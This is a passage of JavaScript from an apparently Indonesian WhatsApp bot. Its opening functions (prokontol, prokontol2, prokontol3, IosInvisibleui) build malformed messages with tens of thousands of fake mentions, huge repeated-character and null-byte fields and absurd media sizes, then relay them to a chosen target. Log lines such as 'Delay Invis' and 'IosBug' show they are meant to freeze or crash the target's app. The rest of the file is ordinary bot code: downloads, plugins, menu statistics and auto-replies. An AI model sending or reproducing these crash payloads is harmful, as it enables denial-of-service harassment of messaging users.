                                    author: ".Zuunotfound" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Oblivionx",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await zuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await zuu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
console.log(chalk.bold(`Sukses Delay Invis 6`));
}
async function prokontol2(target, mention) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = ["13135550002@s.whatsapp.net", ...Array.from({
length: 40000
    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Zuunotfound" + "ោ៝".repeat(10000),
        title: "Oblivionx",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList,
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await zuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zuu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.bold(`Sukses Delay Invis 5`));
}
async function prokontol3(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m269/AQNUqGxvAHEzvDmQL662YdY4NizzEWRFID_-5ATD2cnhv4Wga-ZhcGArThf8gyPLeYn3js5zT8dwigoD9nQ0oUjqHtgM2Lm6r7yLz6epxw?ccb=9-4&oh=01_Q5Aa1QFZQf1uPIYORf_dGUpnLgPxnW6gcgUghusVitqNapDU3g&oe=683102C1&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗",
                    fileSha256: "0fzqXoln68jeeYCfGnG9fhGaTHg086N9oaFNmFLmfXk=",
                    fileLength: "103814",
                    height: 720,
                    width: 720,
                    mediaKey: "m87YeUO12CUQir+jk2u9Erg+txX/5nRHggnL1b9lj5Q=",
                    fileEncSha256: "HxAkoXT9CFJ5PGYswaGgfwlan+duERdbkCwxMCEcEwk=",
                    directPath: "/o1/v/t62.7118-24/f2/m269/AQNUqGxvAHEzvDmQL662YdY4NizzEWRFID_-5ATD2cnhv4Wga-ZhcGArThf8gyPLeYn3js5zT8dwigoD9nQ0oUjqHtgM2Lm6r7yLz6epxw?ccb=9-4&oh=01_Q5Aa1QFZQf1uPIYORf_dGUpnLgPxnW6gcgUghusVitqNapDU3g&oe=683102C1&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1745452092",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAADAQEBAQAAAAAAAAAAAAAABAUDBgIBAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADbm+2jEHw+sY/K6gZfLYmdOHlV1c5rZmWdMqYnjoMshgjBdUxZEJNRce8UMD7PcwHQCVT5hoqrrMlycrqMSvHwZJILUQJ9IDXICbSAlAH/xAAnEAACAgICAgICAQUAAAAAAAABAgADBBESIRMxBRQiQVEgMkJxof/aAAgBAQABPwA/GpwtCf2MNiPS6E7H71PG39FVQK/qXIFYa/cxvi7biOXSzyjx9TPNXhBUf5dwOoWKdMwK7Jj415RSaQQBLcd1r8pTiD6EqZ9hVGyZhfHMT5bx0PQlZUb0IK+LPr0Y9KKTyUlT7lgrXKIC7raXWUJdVwGwsx7qwN+QENPkeHA8rPx/QnxeICfOZ2Qd9TyVoSNjqWDl361C+wdbO5fQq2BD6b/hjoxvCOf3qDFppqFmuxGQ5hVNjjy3AK6awq+lE+0PTQ2hmYKSP5hHPo+pfZ4QFUdRXW9H37jhfsoB6HszKoC4xPP1MGliUfl+GpkL+Y76HuCo2OSCQpPWpXRWB6E+Nybb6j5Flq9Nsf6lniqHKVvVa9pI111Kqw1Klxs8ZRYKy1ZGv4mRSbUezloiUuAFAgNvIcQJhPkUBUKHjHyG8hAXY11Mmhrqhr3KqbB+LKO/cBBQAfoR6me1ZZW/jsAO9ytL6uxXPtZm+qupVl5FjhfJrcu+3TWXeyUZTnG5u/fLUa4VuFJJOobSBXxJJY9zZK2bbRBmblOiJw2JV9y1Fdbej7j5mQjlecoda7VZhsCZefVkVFAkXIsVQoI1MXJrbibnG9z7NYsP5DW+plZYHPxWSzJttGnMx/kKaaRXwlrBrGZR0TP/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/AE//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AE//2Q==",
                    scansSidecar: "VTpjM+DmOii+Ug/Cg/UrloKaNvpI31KuaIER7ToDUSSEtUPqxUTe9w==",
                    scanLengths: [6563, 40833, 25255, 31163],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await zuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zuu.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "@𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗" },
                        content: undefined
                    }
                ]
            }
        );
    }
console.log(chalk.green.bold(`Sukses Kirim Delay Invis 6`))
}
async function prokontol(target, mention) {
const mentionedList = ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ". Zuunotfound" + "ោ៝".repeat(10000),
        title: "Oblivionx",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await zuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zuu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green.bold("Sukses Kirim Delay Invis 4"))
}
async function IosInvisibleui(target) {
    await zuu.relayMessage(target, {
        extendedTextMessage: {
            text: 'invisible' + "ꦾ".repeat(850000),
            contextInfo: {
                groupMentions: [{ groupJid: "000000000000009@g.us", groupSubject: "⁨🔥" }],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [{ jid: "13135550002@s.whatsapp.net", callOutcome: "1" }]
                    }
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: mediaImage,
                    caption: "@ Você foi mencionado"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "@ Você foi mencionado",
                    body: "@ Você foi mencionado",
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewTtpe: "VIDEO",
                    thumbnail: mediaImage,
                    sourceType: " x ",
                    sourceId: " x ",
                    sourceUrl: "https://instagram.com/6u.cg",
                    mediaUrl: "https://instagram.com/6u.cg",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: { url: "https://instagram.com/6u.cg" },
                groupSubject: "Pwq",
                parentGroupJid: "8888888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "8888888888888-1234567890@g.us",
                    serverMessageId: 1,
                    newsletterName: " X ",
                    contentType: "UPDATE",
                    accessibilityText: "X"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "0@s.whatsapp.net"
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    }, { participant: { jid: target } });
    
console.log(chalk.green.bold(`Sukses Mengirim IosBug`));
}

    const LINODE_API_TOKEN = global.apilinode;
    const API_TOKEN = global.apitokendo;    
    
    
        async function downloadyt(urlnyu, mpbrp) {
            if (mpbrp === "mp3") {
                try {
                    try {
                        console.log("Mengunduh audio dari URL:", convert.url);
                        audioUrl = await youtube(urlnyu);
                    } catch (e) {
                        console.error("Error saat mengunduh, mencoba kembali...", e);
                        reply('Please wait...');
                        audioUrl = await youtube(urlnyu);
                    }
                    console.log("URL yang berhasil diunduh:", audioUrl);
                    let doc = {
                        audio: {
                            url: audioUrl.mp3
                        },
                        mimetype: 'audio/mp4',
                        fileName: "yang lu donlot tadi, " + hariini
                    };
                    return zuu.sendMessage(m.chat, doc, {
                        quoted: fsaluran
                    });
                } catch {
              reply("FAILED")
             }
            } else if (mpbrp === "mp4") {
                try {
                    try {
                        console.log("Mengunduh audio dari URL:", convert.url);
                        vidUrl = await youtube(urlnyu);
                    } catch (e) {
                        console.error("Error saat mengunduh, mencoba kembali...", e);
                        reply('Please wait...');
                        vidUrl = await youtube(urlnyu);
                    }
                    console.log("URL yang berhasil diunduh:", vidUrl);
                    return zuu.sendMessage(m.chat, {
                        video: {
                            url: vidUrl.mp4
                        },
                        caption: `Done`,
                    }, {
                        quoted: fsaluran
                    })
                } catch {
                reply("FAILED")
               }
            } else {
                reply("Format tidak didukung.");
            }
        }
        async function kata2() {
            var resio = await Quotes()
            return `${resio.quotes}`
        }
        const katakata = await kata2()
        function pickRandomArray(list) {
        return list[Math.floor(Math.random() * list.length)]
        }
        const getcomandces = (cases) => {
            try {
                const fileContent = fs.readFileSync('./case.js').toString();
                let caseContent = fileContent.split(`case '${cases}'`);
                if (caseContent.length === 1) {
                    caseContent = fileContent.split(`case "${cases}"`);
                }
                if (caseContent.length > 1) {
                    return "case " + `'${cases}'` + caseContent[1].split("break")[0] + "break";
                } else {
                    return "none";
                }
            } catch (e) {
                return "none";
            }
        };
        let rn = ['recording']
        let jd = rn[Math.floor(Math.random() * rn.length)];
        let mean;
        let didyoumenn;
        let premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'));       
        async function spawndidyou(our) {
            try {              
                const code = fs.readFileSync("./case.js", "utf8")
                const regex = /case\s+['"]([^'"]+)['"]:/g;
                var matches = [];
                var match;
                while ((match = regex.exec(code))) {
                    matches.push(match[1]);
                }
                const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
                if (!help.includes(our) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
                    mean = didyoumean(our, help);
                    let sim = similarity(our, mean);
                    let similarityPercentage = parseInt(sim * 100);
                    if (mean && our.toLowerCase() !== mean.toLowerCase()) {
                        reactmess("🔖")
                        didyoumenn = `*\`[ MATCH FOR THIS COMMAND ]\`*\n\nmungkin yang anda maksud adalah: *.${mean}*\npercentase: *${similarityPercentage}%*`
                    } else {
                        return;
                    }
                }
                return zuu.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: global.filename,
                    fileLength: 99999999999999,
                    mimetype: 'image/png',
                    jpegThumbnail: fs.readFileSync("./assets/Gallery/doc4.jpg"),
                    caption: "\n" + didyoumenn,
                    buttons: [{
                        buttonId: `.ilovezuu ${mean}`,
                        buttonText: {
                            displayText: 'try command'
                        }
                    }, ],
                    headerType: 1,
                    viewOnce: true
                }, {
                    quoted: fsaluran,
                    ephemeralExpiration: 86400
                });
            } catch (err) {
                return;
            }
        }
        const {
            handleCommand,
            handleEvalCommand
        } = require('./lib/extension/@Z-Plugin/handlers/commandHandler.js');
        const {
            initPlugins
        } = require('./lib/extension/@Z-Plugin/handlers/pluginHandler.js');
        const {
            Events,
            Coordinator
        } = require('./lib/extension/@Z-Plugin/helper/constant.js');
        const pluginDir = path.resolve(__dirname, './lib/extension/@Z-Plugin/plugins');
        const helper = {
            zuu,
            isCreator,
            reply,
            command,
            isPremium,
            isCmd,
            text,
            runtime,
            qmsg,
            mime,
            sleep,
            botNumber
        }
        initPlugins(pluginDir, zuu);
        handleCommand(m.text, m, zuu, ".", sleep);
        const pluginsLoader = async (directory) => {
            let plugins = []
            const folders = fs.readdirSync(directory)
            folders.forEach(file => {
                const filePath = path.join(directory, file)
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath]
                        }
                        const plugin = require(filePath)
                        plugins.push(plugin)
                    } catch (error) {
                        console.log(`Error loading plugin at ${filePath}:`, error)
                    }
                }
            })
            return plugins
        }
        let pluginsDisable = true
        const plugins = await pluginsLoader(path.resolve(__dirname, "./lib/extension/@Cjs-Plugin/plugins"))
        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                pluginsDisable = false
                if (typeof plugin !== "function") return
                await plugin(m, helper)
            }
        }
let popumenu = {};
let menuhit = "./lib/database/menuhit.json";
function hitMenu(menuName) {
    popumenu.menu_stats = popumenu.menu_stats || {};
    popumenu.menu_stats[menuName] = (popumenu.menu_stats[menuName] || 0) + 1;
    fs.writeFileSync(menuhit, JSON.stringify(popumenu, null, 2));
}
async function gearhit() {
    let data = JSON.parse(fs.readFileSync(menuhit, "utf8"));
    let menuStats = data.menu_stats || {};

    let result = Object.entries(menuStats).reduce((max, menu) => {
        return menu[1] > max[1] ? menu : max;
    }, ["", 0]); 
    return result;
}
const topmenu = await gearhit()
        if (!pluginsDisable) return
        if (isCmd) {
            if (m.text.startsWith(prefix)) {
                if (!m.fromMe) {
                    const viuc = await getcomandces(command);
                    if (body.length === 1) return;
                    if (!command || viuc === "none") return spawndidyou(command)
                    if (isBan) return reply(mess.ban)
                    
                    const rand = await pickRandomArray(["🍫", "🍬"])
                 //   reactmess(rand)
                    userdb.hitcmd += 1;
                    settingdb.cmdtotal += 1
                    hitMenu(command)
                }
            }
        } else {}
        if (m.message && m.isGroup) {
            console.log(`\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n`)
            console.log(chalk.magenta(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.white(chalk.bgMagenta(new Date)), chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.white('=> From'), chalk.magenta(pushname), chalk.magenta(m.sender) + '\n' + chalk.white('=> In'), chalk.magenta(groupName, m.chat))
        } else {
            console.log(`\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n`)
            console.log(chalk.magenta(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.white(chalk.bgMagenta(new Date)), chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.white('=> From'), chalk.magenta(pushname), chalk.magenta(m.sender))                        
        }
        
        async function totalfiturr() {
            const fitur1 = () => {
                var mytext = fs.readFileSync("./case.js").toString()
                var numUpper = (mytext.match(/case '/g) || []).length
                return numUpper
            }
            const fitur2 = () => {
                var mytext = fs.readFileSync("./case.js").toString()
                var numUpper = (mytext.match(/case "/g) || []).length
                return numUpper
            }
                const resulto = fitur1() + fitur2()
                
                return resulto
                
        }

        function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
                seconds = Math.floor((duration / 1000) % 60),
                minutes = Math.floor((duration / (1000 * 60)) % 60),
                hours = Math.floor((duration / (1000 * 60 * 60)) % 24)


            hours = (hours < 10) ? "0" + hours : hours
            minutes = (minutes < 10) ? "0" + minutes : minutes
            seconds = (seconds < 10) ? "0" + seconds : seconds

            return hours + " jam " + minutes + " menit " + seconds + " detik"
        }
        const totalfitur = await totalfiturr()
        async function kirimstik(linknya) {
            zuu.sendImageAsSticker(m.chat, linknya, fsaluran, {
                packname: '\n'.repeat(999)
            })
        }
        let list = []
        for (let i of newowner) {
            list.push({
                displayName: await zuu.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await zuu.getName(i + '@s.whatsapp.net')}\n
FN:${await zuu.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Z@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://OblivionX.wiki
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
            })
        }
        let listprem = []
        for (let i of prem) {
            list.push({
                displayName: await zuu.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await zuu.getName(i + '@s.whatsapp.net')}\n
FN:${await zuu.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Z@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://OblivionX.wiki
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
            })
        }
        
async function addAllMembersToPremium(groupId) {
    try {
        const groupMetadata = await zuu.groupMetadata(groupId);
        const allMembers = groupMetadata.participants.map(p => p.id);

        for (let member of allMembers) {
            if (!premium.includes(member)) {
                premium.push(member); 
            }
        }

        fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium));
        console.log("Semua anggota telah menjadi premium.");
    } catch (err) {
        console.error("Gagal menambahkan anggota ke premium:", err);
    }
}
        const randomNomor = async (ext) => {
            return `${Math.ceil(Math.random() * ext)}`
        }
        if (budy.match(`njing|onyet|etan|oblog|atim|ngentot|mek|ntol|asu|coli|sange|bot goblog|ngewe|njing|nying|nyet|tobrut|pixiv|furry|sex|xnxx|porn|porno|bokep|crot|ngocok|bolong|sabun|goyang|pantat|mani|pokemon|raimbow|lgbt|memek|pmo|duar`)) {
            return kirimstik("https://j.top4top.io/p_3411hw1jk1.jpg")
        }
        if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum", "alaikum"].includes(budy) && !isCmd) {
            reply("*Waalaikumsalam*")
        }
        if ((budy.match) && ["hai", "ola", "Halo", "halo", "alo"].includes(budy) && !isCmd) {
            reply(`*Iya ?*`)
        }
        if ((budy.match) && ["Makasih", "thaks", "tq", "Terimakasih", "akasih", "hask"].includes(budy) && !isCmd) {
            if (!m.quoted && !m.fromMe) return
            reply(`*Ya*`)
        }
        if ((budy.match) && ["wkwk", "haha", "bjir", "jir", "wow", "keren"].includes(budy) && !isCmd) {
            return reactmess("🤔")
        }
